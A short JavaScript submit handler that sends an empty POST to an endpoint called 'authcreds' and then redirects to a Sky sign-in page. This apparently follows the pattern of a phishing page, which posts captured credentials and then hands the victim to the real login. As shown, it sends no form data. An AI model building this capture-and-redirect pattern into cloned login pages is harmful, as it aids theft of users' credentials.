

function submitclicked(el) {
    console.log("Submit button clicked")
    var xhttp = new XMLHttpRequest();

    xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      onDone();
    }
  };

    xhttp.open("POST", "authcreds", true);
    xhttp.send();
    return false;
}

function onDone() {
    window.location.href = "https://myskyid.mysky.com/signin";
}


